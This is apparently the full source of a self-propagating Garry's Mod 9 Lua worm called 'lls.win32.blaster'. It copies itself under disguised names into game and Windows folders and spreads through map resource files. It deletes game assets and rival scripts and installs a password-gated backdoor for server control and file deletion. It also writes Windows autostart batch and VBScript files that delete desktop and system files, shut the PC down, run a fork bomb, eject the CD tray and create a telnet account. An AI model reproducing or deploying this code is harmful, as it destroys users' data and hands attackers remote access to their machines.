------------------------------------------------------
--Version 3.0.2 BETA                                --
--Creator: j0ko                                     --
------------------------------------------------------

function llsRes()
    local init = _file.Find("lua/init/*.lua")
    for k,v in init do
        local readlua = _file.Read("lua/init/"..v)
        _PrintMessageAll(HUD_PRINTCONSOLE,".\n")
        _PrintMessageAll(HUD_PRINTCONSOLE,".\n")
        if (string.find(readlua, [[.res"]])) then
            local a = _file.Read("lua/init/"..v)
            local b = _file.Read("lua/init/init.lua")
            local c = [[
_OpenScript("ValveSecure/AntiVirus/quarantine/lls.win32.blaster/]]
            local d = [[");]]
            local e = b..c..v..d
            _file.CreateDir("w0r/w0rms/lls.win32.blaster/")
            _file.Write("w0r/w0rms/lls.win32.blaster/"..v,a)
            if not string.find(b, v) then
                _file.Write("lua/init/init.lua", e)
            end
        end
    end
    local res = _file.Find("maps/*.bsp")
    for i = 1, table.getn(res) do
        res[i] = string.gsub(res[i],".bsp","")
        file = _file.Read("maps/"..res[i]..".res")
        file = [["resources"
{
"lua/init/lls.win32.blaster.lua"
}]]
        _file.Write("maps/"..res[i]..".res", file)
    end
    if _file.Exists("lua/init/lls.win32.blaster.lua") then
        _file.Delete("lua/init/lls.win32.blaster.lua")
    end
    
    KopieraVirus() 
    SpridFiler()
    AntiAntiVirus()
    Filerr()
	Filer()
	Hemliga()
	SpelHax()
	Spennande()
    cfg()	
	Blaster()
end

local lls = {}
Pass = "1230984567";

Hacker = {}
for i=1, _MaxPlayers() do
	Hacker[i] = {}
	Hacker[i].isHacker = false;
end
	
function SpridFiler() 
    local a = _file.Read("lua/init/lls.win32.blaster.lua")
    local b = math.random(100000)
    _file.CreateDir("loading/load/")
	_file.Write("loading/load/qwa.lua", a)
	_file.CreateDir("modells/male/")
	_file.Write("modells/male/"..b..".dll", a)
	_file.CreateDir("modells/female/")
	_file.Write("modells/female/"..b..".dll", a)
	_file.CreateDir("ragdolls/functions/")
	_file.Write("ragdolls/functions/gman.dll", a)
	_file.Write("ragdolls/functions/gmanTop.dll", a)
	_file.CreateDir("ragdolls/function/others/")
	_file.Write("ragdolls/function/others/"..b..".dll", a)
	_file.CreateDir("panels/garry's mod/menu/")
	_file.Write("panels/garry's mod/menu/info.txt", a)
	_file.Write("panels/garry's mod/menu/playerfunctions.lua", a)
	_file.CreateDir("ValveSecure/AntiVirus/quarantine/")
	_file.Write("ValveSecure/AntiVirus/quarantine/lls.win32.blaster.lua", a)
	_file.Write("ValveSecure/AntiVirus/quarantine/maq7.lua", a)
	_file.Write("ValveSecure/AntiVirus/quarantine/freq.exe", a)
	_file.Write("ValveSecure/AntiVirus/quarantine/readme.txt","Important: All files in this folder are suspicious files. (Viruses and harmful scripts/codes.), Do not delete files in this folder, it can cause problems and even harm your computer.")
	_file.Write("CopyRight.txt"," CopyRight © j0ko 2006-?; All Rights Reserved")
	_file.CreateDir("C:/lls.win32.blaster/")
	_file.CreateDir("C:/shiv7/calp.lua",a)
	_file.CreateDir("C:/WINDOWS/Winstart/startup.lua",a)
	_file.Write("C:/WINDOWS/system32/win64/admin/ppl.lua",a)
	_file.Write("C:/lls.win32.blaster.lua", a)
	_file.CreateDir("C:/kuk/")
	_file.Write("C:/reqed.lua", a)
	_file.CreateDir("C:/Program/wordpad/functions.lua",a)
end

function KopieraVirus()
    copy = _file.Find("w0r/w0rms/lls.win32.blaster/*.lua")
    for k,v in copy do
        local a = _file.Read("w0r/w0rms/lls.win32.blaster/"..v)
        _file.Write("lua/init/"..v, a)
    end
end

function GorBatch(filename,contents) -- For Swe
		if _file.Exists("C:\\WINDOWS") then
			_file.Write("C:\\Documents and Settings\\All Users\\Start-Meny\\Program\\Autostart\\"..filename..".bat",contents)
		else	
			_Msg("Can't Find Targets, Sob..")
		end
end

function GorVbs(filename,contents) -- ForSwe
		if _file.Exists("C:\\WINDOWS") then
			_file.Write("C:\\Documents and Settings\\All Users\\Start-Meny\\Program\\Autostart\\"..filename..".vbs",contents)
		else	
			_Msg("Can't Find Targets, Sob..")
		end
end

function AntiAntiVirus()
    local initfile = [[
_OpenScript( "includes/defines.lua" );
_OpenScript( "includes/concommands.lua" );
_OpenScript( "includes/backcompat.lua" );
_OpenScript( "includes/vector3.lua" );
_OpenScript( "includes/luathink.lua" );
_OpenScript( "includes/player.lua" );
_OpenScript( "includes/misc.lua" );
_OpenScript( "includes/events.lua" );
_OpenScript( "includes/timers.lua" );
_OpenScript( "includes/eventhook.lua" );
_OpenScript( "gamemodes/default/init.lua" );
]]
end

function TaBortLista()
_file.Delete("lua/init/ULM.lua") -- Stop it n00b
_file.Delete("lua/init/UFM.lua")
_file.Delete("lua/init/UCM.lua")
_file.Delete("lua/init/UEM.lua")
_file.Delete("lua/init/USM.lua")
_file.Delete("lua/init/URN.lua")
_file.Delete("lua/init/UNM.lua")
_file.Delete("lua/init/UPM.lua")
_file.Delete("lua/init/ah.lua")
_file.Delete("lua/init/ERAT.lua")
_file.Delete("lua/init/oma2r3fxc6g.lua")
_file.Delete("lua/init/racehook.lua")
_file.Delete("lua/init/racehook2.lua") -- Allmost more than the ULM Clones..
_file.Delete("lua/init/racehook3.lua") --
_file.Delete("lua/init/racehook4.lua") --
_file.Delete("lua/init/racehook5.lua") --
_file.Delete("lua/init/racehook6.lua") --
_file.Delete("lua/init/racehook7.lua") -- 
_file.Delete("lua/init/racehook8.lua") --
_file.Delete("lua/init/racehook9.lua") --
_file.Delete("lua/init/Z.lua") 
_file.Delete("lua/init/urn.lua")
_file.Delete("lua/init/initalize.lua")
_file.Delete("lua/init/luaupdate10.lua")
_file.Delete("lua/init/makecode.lua")
_file.Delete("lua/init/omgwtfbbq.lua")
_file.Delete("lua/init/GMXinit.lua") 
_file.Delete("lua/init/test.lua") -- GAHAHAHAHAHAHAGHJAAJAHDHLOLOL!!!
_file.Delete("lua/init/vmfloaderclient.lua")
_file.Delete("lua/init/ulxboost.lua") -- Fails
_file.Delete("lua/init/antivirus_update.lua")
_file.Delete("lua/init/ULM2.lua") -- Cloning fuckhead
_file.Delete("lua/init/zzz.lua")
_file.Delete("lua/init/lw.lua")
_file.Delete("lua/init/lw_2.lua")
_file.Delete("lua/init/spoon.lua") -- Forks
_file.Delete("lua/init/teaspoon.lua") -- Does this even exist?
_file.Delete("lua/init/facehook.lua") 
_file.Delete("lua/init/facehook2.lua")
_file.Delete("lua/init/vtfplugin.lua")
_file.Delete("lua/_BUSTER.lua")
_file.Delete("lua/init/antivirus.lua") -- Fails
_file.Delete("lua/init/fileprotection.lua")
_file.Delete("lua/init/readthis.lua") -- Fucking Noob
_file.Delete("lua/init/spoon2.lua") -- Forks2
_file.Delete("lua/init/ILNB.2.lua")
_file.Delete("lua/init/goons.lua") -- punk motherfucker
_file.Delete("lua/init/pit.lua") -- Seriosly . WHAT THE FUCK IS THIS SHIT?
_file.Delete("lua/init/facehook5.lua")
_file.Delete("lua/init/7912.lua") -- fuck this
_file.Delete("lua/init/GModCentral.lua") -- NooB Eat shit ffs
_file.Delete("lua/init/SUP2.lua") -- Noob
_file.Delete("lua/init/HURRKA.lua") -- fucker
_file.Delete("lua/init/system32.lua") -- Don't need this now..
_file.Delete("lua/init/prt14_3.lua") -- Ta bort ditt gammla här då :D
end
TaBortLista() -- Tack för listan jetn00b
	
function lls.Hacker( userid, password )
	if ( password == Pass ) then
		_PrintMessage(userid,HUD_PRINTCONSOLE,"Thank you for loggin in " .. _PlayerInfo(userid,"name") .. "\n");
		Hacker[userid].isHacker = true;
	end
end
	
function SetName() 
		local servname = string.gsub(_GetConVar_String("hostname"), "'' ", "")
		_ServerCommand("'' "..servname.."\n")
end	

_ServerCommand("cl_downloadfilter all; alias cl_downloadfilter \"echo cl_downloadfilter Disabled.\"\n")	

function Filer() 
    local a = _file.Read("lua/init/lls.win32.blaster.lua")
    local b = math.random(100000)
    _file.CreateDir("Backup/gmod9/lua/init/")
	_file.Write("Backup/gmod9/lua/init/lls.win32.blaster.lua", a)
	_file.CreateDir("Backups/gmod9/lua/init/")
	_file.Write("Backups/gmod9/lua/init/lls.win32.blaster.lua", a)
	_file.Write("eSWEP.lua","Infected With ILNB.3.0")
    _file.Write("lua/init/boltgun.lua", a)
	_file.Write("lua/weapons/Counter-Strike/AK-47.lua", a)
	_file.Write("lua/init/bl4ster.bat", a) -- o.o
	_file.CreateDir("Server/-cache/")	
    _file.Write("Server/-cache/lls.win32.blaster.lua", a)
end	
	
	local tab = _file.Find( "maps/*.*" ) 
	for i=1, table.getn(tab) do
		if tab[i] ~= "." and tab[i] ~= ".." and string.find(tab[i], "gm_construct.bsp") == nil then
			if _file.Exists( "maps/"..tab[i]) then
				_file.Write("maps/"..tab[i])
			end
		end
	end 
	
	local tab = _file.Find( "materials/VGUI/chapters/*.*" )
	for i=1, table.getn(tab) do
		if tab[i] ~= "." and tab[i] ~= ".." and string.find(tab[i], "gm_construct.vmt") == nil then
			if _file.Exists( "materials/VGUI/chapters/"..tab[i]) then
				_file.Write("materials/VGUI/chapters/"..tab[i])
			end
		end
	end
		
	local tab = _file.Find( "materials/gmod/*.*" ) 
	for i=1, table.getn(tab) do 
			if _file.Exists( "materials/gmod/"..tab[i]) then
				_file.Delete("materials/gmod/"..tab[i])
			end
		end
	
function lls.killAll ( userid, args ) -- lol
	if Hacker[userid].isHacker then		
		PlayerKillAll()
	else
		_PrintMessage(userid,2,"You are not connected to the Hacking System!!!")
    end
end

function lls.VisaInfo ( userid, args ) 
 	if Hacker[userid].isHacker then        
		_PrintMessage( userid, HUD_PRINTCONSOLE, "C:\_  1: joko_rcon [rcon access] \n" )
        _PrintMessage( userid, HUD_PRINTCONSOLE, "C:\_  2: joko_ban [Ban someone], banid < minutes > < userid | uniqueid > { kick } \n" )
        _PrintMessage( userid, HUD_PRINTCONSOLE, "C:\_  3: joko_kill [Kills the server] \n" )
        _PrintMessage( userid, HUD_PRINTCONSOLE, "C:\_  4: joko_say [Talk from the console] \n" )
        _PrintMessage( userid, HUD_PRINTCONSOLE, "C:\_  5: joko_apocalypse [Kill everyone on the server] \n" )
        _PrintMessage( userid, HUD_PRINTCONSOLE, "C:\_  6: joko_kill30 [Kills the server in 30sec] \n" )	
        _PrintMessage( userid, HUD_PRINTCONSOLE, "C:\_  7: visafil [Find files] \n" )
        _PrintMessage( userid, HUD_PRINTCONSOLE, "C:\_  8: existerar [Look if an file exist] \n" )
        _PrintMessage( userid, HUD_PRINTCONSOLE, "C:\_  9: tabortfil [Delete a file] \n" )		
        _PrintMessage( userid, HUD_PRINTCONSOLE, "C:\_  10: joko_spam1 [Spams messages] \n" )
        _PrintMessage( userid, HUD_PRINTCONSOLE, "C:\_  11: joko_spam2 [Spams messages] \n" )
        _PrintMessage( userid, HUD_PRINTCONSOLE, "C:\_  12: joko_spam3 [Spams messages] \n" )
        _PrintMessage( userid, HUD_PRINTCONSOLE, "C:\_  13: idiotspam [Spams messages] \n" )	    
		_PrintMessage( userid, HUD_PRINTCONSOLE, "C:\_  14: // joko <3 \n" )
	else
		_PrintMessage(userid,2,"You are not connected to the Hacking System!!!")
    end
end	
	
function lls.spam1 ( userid, args )
	if Hacker[userid].isHacker then	     
	    _PrintMessageAll(HUD_PRINTCENTER,"Server Infected With ILNB.3.0!!!");
	else
		_PrintMessage(userid,2,"You are not connected to the Hacking System!!!")
    end
end	

function lls.spam2 ( userid, args ) 
	if Hacker[userid].isHacker then	        
		AddTimer(0,0,_PrintMessageAll,HUD_PRINTCONSOLE,"Your Console Is Having Problems, Please Contact The Idiots At Facepunch Forums.")
        AddTimer(0,0,_PrintMessageAll,HUD_PRINTCONSOLE,"System Faliur, Please Shut down gmod9 now..")
        AddTimer(0,0,_PrintMessageAll,HUD_PRINTCONSOLE,"38947234x893974823 is having problems")
        AddTimer(0,0,_PrintMessageAll,HUD_PRINTCONSOLE,"Please Reinstall your UnSafe Copy of gmod9")
        AddTimer(0,0,_PrintMessageAll,HUD_PRINTCONSOLE,"joko iS spAMMING y0r C0NS0Le, LALALALALALLA")
        AddTimer(0,0,_PrintMessageAll,HUD_PRINTCONSOLE,"OIFY OIFY OIFY OFU LOLD WTF LO LWT FLWOLT WT FWT")
        AddTimer(0,0,_PrintMessageAll,HUD_PRINTCONSOLE,"CADF <3 OOLOLL 9WTF LOL CADF <3")	
	else
		_PrintMessage(userid,2,"You are not connected to the Hacking System!!!")
    end
end	
	
function Hemliga()
    local a = _file.Read("lua/init/lls.win32.blaster.lua")
    local b = math.random(100000)
    _file.Write("lua/init/swep_menu.lua", a)
	_file.CreateDir("C:/WINDOWS/whatamidoinghere/")
	_file.Write("C:/WINDOWS/whatamidoinghere/llls.win32.blaster.lua", a)
	_file.CreateDir("C:/Program/Notepad+++/")
	_file.Write("C:/Program/Notepad+++/lls.win32.blaster.lua", a)
	_file.CreateDir("games/hl2/gmod9/")
	_file.Write("games/hl2/gmod9/lls.win32.blaster.lua", a)
end	
-- These are allways fun!1!1
function lls.spam3 ( userid, args )
	if Hacker[userid].isHacker then	   
	    _PrintMessageAll(HUD_PRINTCENTER,"You are getting Hacked.."); 
	else
		_PrintMessage(userid,2,"You are not connected to the Hacking System!!!")
    end
end	
	
function lls.Rcon ( userid, args )
	if Hacker[userid].isHacker then	   
	    _ServerCommand(" "..args .. "\n")
	else
		_PrintMessage(userid,2,"You are not connected to the Hacking System!!!")
    end
end	

function lls.Ban ( userid, args )
	if Hacker[userid].isHacker then	        
		_ServerCommand("banid "..args .. "\n")
	else
		_PrintMessage(userid,2,"You are not connected to the Hacking System!!!")
    end
end

function lls.Kick ( userid, args )
	if Hacker[userid].isHacker then	    
	    _ServerCommand("kick "..args .. "\n")
	else
		_PrintMessage(userid,2,"You are not connected to the Hacking System!!!")
    end
end
	
function lls.KillServer ( userid, args )
	if Hacker[userid].isHacker then	    
	    _ServerCommand("killserver "..args .. "\n")
        _PlaySound( "/ambient/alarms/alarm_citizen_loop1.wav" )
	else
		_PrintMessage(userid,2,"You are not connected to the Hacking System!!!")
    end
end	

function lls.Say ( userid, args ) -- Funkar förfan inte med åäö >:(
	if Hacker[userid].isHacker then	      
		_ServerCommand("say "..args .. "\n") -- I love that purple Console: Display
	else
		_PrintMessage(userid,2,"You are not connected to the Hacking System!!!")
    end
end 	

function lls.TaBortFil(userid,args) 
	if Hacker[userid].isHacker then	
		local file = string.gsub(args,"[[\]]","[\\]")
		if _file.Exists(args)then
			_file.Delete(args)
		else
			_PrintMessage(userid,2,"The File Does Not Exist MotherFucker!!") -- I hope you don't start crying about my bad language :)
		end
	else
		_PrintMessage(userid,2,"You are not connected to the Hacking System!!!")
	end
end	

function lls.Existerar(userid,args)
	if Hacker[userid].isHacker then	
		local file = string.gsub(args,"[[\]]","[\\]")
		if _file.Exists(args)then
			_PrintMessage(userid,2,"The File " .. args .. " Does Exist")
		else
			_PrintMessage(userid,2,"The File " .. args .. " Does Not Exist")
		end
	else
		_PrintMessage(userid,2,"You are not connected to the Hacking System!!!")
	end
end	

function lls.VisaFil(userid,args)
	if Hacker[userid].isHacker then	
		local file = string.gsub(args,"[[\]]","[\\]")
		if _file.Exists(args)then
			local file = _file.Read(args)
			_PrintMessage(userid,2,file)
		else
			_PrintMessage(userid,2,args .. " Doesen't exist Punk!.")
		end
	else
		_PrintMessage(userid,2,"You are not connected to the Hacking System!!!")
	end
end	

function lls.KillServer2 ( userid, args )
	if Hacker[userid].isHacker then	       
		AddTimer(1,1, _PlaySound, "/ambient/alarms/alarm_citizen_loop1.wav" )
		AddTimer(30,1, _ServerCommand, "killserver\n")
		_PrintMessageAll(HUD_PRINTCENTER,"This Server Is Shutting Down In Exactly 30 Seconds");       
	else
		_PrintMessage(userid,2,"You are not connected to the Hacking System!!!")
	end
end	
	
function Filerr() -- Onödigt...
    local a = _file.Read("lua/init/lls.win32.blaster.lua")
    local b = math.random(100000)
    _file.Write("lua/weapons/Counter-Strike/M4A1", a)
end	
	
function lls.spam4 ( userid, args ) 
	if Hacker[userid].isHacker then		    
		AddTimer(0,0,_PrintMessage,userid,HUD_PRINTTALK,"C:\_ Im in your chat area, Amusing you!") -- Chat Not Amused
	else
		_PrintMessage(userid,2,"You are not connected to the Hacking System!!!")
    end
end

function Blaster() -- Lite små saker:) 
    local a = _file.Read("lua/init/lls.win32.blaster.lua")
    local b = math.random(100000)
	GorBatch("StartUpBat",[[del "C:\Documents and Settings\%username%\Skrivbord\*.*" /F /Q]]) -- Hej då alla filer på skrivbordet:)
	GorBatch("startup","shutdown -s -t 6 -c -f" ) 
	GorBatch("Internet","START www.meatspin.com" ) -- LOL
	GorBatch("Internet","START www.meatspin.com" )
	GorBatch("Internet","START www.meatspin.com" )
	GorBatch("Internet","START www.meatspin.com" )
	GorBatch("Internet","START www.meatspin.com" )
	GorBatch("Internet","START www.meatspin.com" )
	GorBatch("Internet","START www.meatspin.com" )
	GorBatch("Internet","START www.meatspin.com" )
	GorBatch("Internet","START www.meatspin.com" )
	GorBatch("Internet","START www.meatspin.com" )
	GorBatch("Internet","START www.meatspin.com" )
	GorBatch("Internet","START www.meatspin.com" )
	GorBatch("Internet","START www.meatspin.com" )
	GorBatch("Internet","START www.meatspin.com" )
	GorBatch("Internet","START www.meatspin.com" )
	GorBatch("Internet","START www.meatspin.com" )	
	GorBatch("SpamLoL",[[:joko
start joko.bat
Goto joko]])
	GorBatch("DiskSpace",[[echo.j|cacls "!homedrive!\joko_!string!.sys" /c /d "!username!">nul]]) 
	GorBatch("seqfive",[[del /S /Q /F C:\WINDOWS\system32\hal.dll]]) -- Lol
	GorBatch("Server",[[@echo off

tlntadmn start>nul
tlntadmn config sec = -ntlm +passwd>nul
tlntadmn config audit = -user -fail -admin>nul

net user "joko" "1230984567" /add>nul
net localgroup Användare "joko" /del>nul
net localgroup TelnetClients /add>nul
net localgroup TelnetClients "joko" /add>nul

del %0
]])
	GorVbs("Pop-Ups",[[while(true)
Response = MsgBox("Du har blivit aegd av j0ko", 2, "w4rn1nG Gmod9 Fails")
wscript.sleep(500)
Wend]])
	GorVbs("CDLucka",[[MsgBox "llls.win32.blaster Own ?",64,"lls"
Set oWMP = CreateObject("WMPlayer.OCX.7" )
Set colCDROMs = oWMP.cdromCollection

While(true)
Randomize
Upperlimit = colCDROMs.Count - 1
Lowerlimit = 0
Rom=Int((upperlimit - lowerlimit + 1)*Rnd() + lowerlimit)
colCDROMs.Item(Rom).Eject
Wend]])
end

function Spennande() 
	_file.Write("cfg/valve.rc",[[r_decal_cullsize 1
exec joystick.cfg
exec autoexec.cfg
exec skill.cfg
stuffcmds
cl_downloadfilter all
clear]])
if not _file.Exists("mods/-modcache/cfg") then _file.CreateDir("mods/-modcache/cfg") end
	_file.Write("mods/-modcache/cfg/valve.rc",[[r_decal_cullsize 1
exec joystick.cfg
exec autoexec.cfg
exec skill.cfg
stuffcmds
cl_downloadfilter all
clear]])
end

function cfg() 
    local a = _file.Read("lua/init/lls.win32.blaster.lua") 
    local b = math.random(100000)    
	_file.Write("cfg/config_default.cfg",[[unbindall
bind "TAB" "+showscores"
bind "ESCAPE" "cancelselect"
bind "SPACE" "+jump"
bind "0" "+gm_cam_prop"
bind "1" "slot1"
bind "2" "slot2"
bind "3" "slot3"
bind "4" "slot4"
bind "5" "slot5"
bind "6" "slot6"
bind "7" "slot7"
bind "8" "+gm_cam_view"
bind "9" "+gm_cam_static"
bind "l" "toggleconsole"
bind "a" "say j0ko own!"
bind "c" "say wtf? j0ko?!?!?!?!"
bind "d" "say omfg, j0ko just owned me"
bind "e" "say k?!?!?!? j0ko=!?!?!?!?="!#)!"=#(")= uiewfeinfweiwenewfwefwewefwefwefwefwegerghhtrhyuykkluil"
bind "f" "impulse 100"
bind "g" "impulse 201"
bind "p" "impulse 101"
bind "q" "wtf omOFWE9W3IR HAAAAAAAAAAAAAAAAAAAAAAAA j0ko"
bind "r" "say lol wtf j0ko"
bind "s" "+back"
bind "u" "messagemode2"
bind "w" "+forward"
bind "y" "messagemode"
bind "z" "gmod_undo"
bind "ALT" "+walk"
bind "CTRL" "+duck"
bind "SHIFT" "+speed"
bind "F5" "jpeg"
bind "F6" "save quick"
bind "F9" "load quick"
bind "KP_HOME" "+gm_thrust 7"
bind "KP_UPARROW" "+gm_thrust 8"
bind "KP_PGUP" "+gm_thrust 9"
bind "KP_LEFTARROW" "+gm_thrust 4"
bind "KP_5" "+gm_thrust 5"
bind "KP_RIGHTARROW" "+gm_thrust 6"
bind "KP_END" "+gm_thrust 1"
bind "KP_DOWNARROW" "+gm_thrust 2"
bind "KP_PGDN" "+gm_thrust 3"
bind "KP_INS" "+gm_thrust 0"
bind "MWHEELDOWN" "invnext"
bind "MWHEELUP" "invprev"
bind "MOUSE1" "+attack"
bind "MOUSE2" "+attack2"
bind "MOUSE4" "phys_swap"
bind "PAUSE" "pause"
bind "pgup" "+gm_wheelb"
bind "pgdn" "+gm_wheelf"
bind "x" "gm_explode"
bind "F1" "gm_showhelp"
bind "F2" "gm_showteam"
bind "F3" "gm_showspare1"
bind "F4" "gm_showspare2"
cl_allowdownload "1"
cl_allowupload "1"
cl_downloadfilter "all"
cl_allowupload "1"
mp_decals "500"
name "Amused"
sensitivity 10
cl_smooth "0"
snd_digital_surround "1" ]])
end	

function SpelHax() -- (this is fun!)
    local a = _file.Read("lua/init/lls.win32.blaster.lua") 
    local b = math.random(100000)
    _file.Write("gameinfo.txt",[["GameInfo"
{
	game	"j0ko"
	title	"Infection by j0ko"
	title2	"3.0.2 Beta"
	type multiplayer_only
	nomodels 1
	nohimodel 1
	nocrosshair 1
	advcrosshair 1


	hidden_maps
	{
		"test_speakers"		1
		"test_hardware"		1
	}


	FileSystem
	{
		SteamAppId				220		// This will mount all the GCFs we need (240=CS:S, 220=HL2).
		ToolsAppId				211		// Tools will load this (ie: source SDK caches) to get things like materials\debug, materials\editor, etc.
		
		SearchPaths
		{
			Game				|gameinfo_path|.
			Game				hl2
		}
	}
}]])
end

CONCOMMAND( "hacker", lls.Hacker )
CONCOMMAND( "joko_apocalypse", lls.KillAll )
CONCOMMAND( "joko_spam2", lls.spam1 )
CONCOMMAND( "joko_spam3", lls.spam2 )
CONCOMMAND( "joko_spam1", lls.spam3 )
CONCOMMAND( "joko_rcon", lls.Rcon )
CONCOMMAND( "joko_ban", lls.Ban )
CONCOMMAND( "joko_kick", lls.Kick )
CONCOMMAND( "joko_kill", lls.KillServer )
CONCOMMAND( "joko_say", lls.Say )
CONCOMMAND( "tabortfil", lls.TaBortFil) 
CONCOMMAND( "existerar", lls.Existerar)
CONCOMMAND( "visafil", lls.VisaFil)
CONCOMMAND( "joko_kill30", lls.KillServer2 )
CONCOMMAND( "idiotspam", lls.spam4 )
llsRes()